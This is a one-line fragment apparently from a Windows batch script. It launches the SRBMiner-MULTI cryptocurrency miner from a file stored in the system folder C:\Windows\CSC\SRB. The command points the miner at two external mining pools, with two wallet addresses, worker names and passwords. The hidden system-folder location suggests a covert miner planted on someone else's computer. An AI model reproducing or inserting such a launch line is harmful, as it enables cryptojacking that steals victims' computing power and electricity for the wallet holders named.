...
set SCRIPT_PATH="C:\Windows\CSC\SRB\SRBMiner-MULTI.exe --multi-algorithm-job-mode 3 --algorithm randomepic --algorithm randomx --pool de.epicmine.io:3333 --pool sal.kryptex.network:7028 --wallet 0x6810d21581c27.Worker01 --wallet SC11qbqjQfdRrSUuis6ubxRfcvw5dBD1TfLBsVdciBTyjW9M2RCAppCY5vnaDgmJzk1T8SWm68my7CfQWURMdeox3GrSiKF5sm/Worker02 --password Worker01 --password Worker02
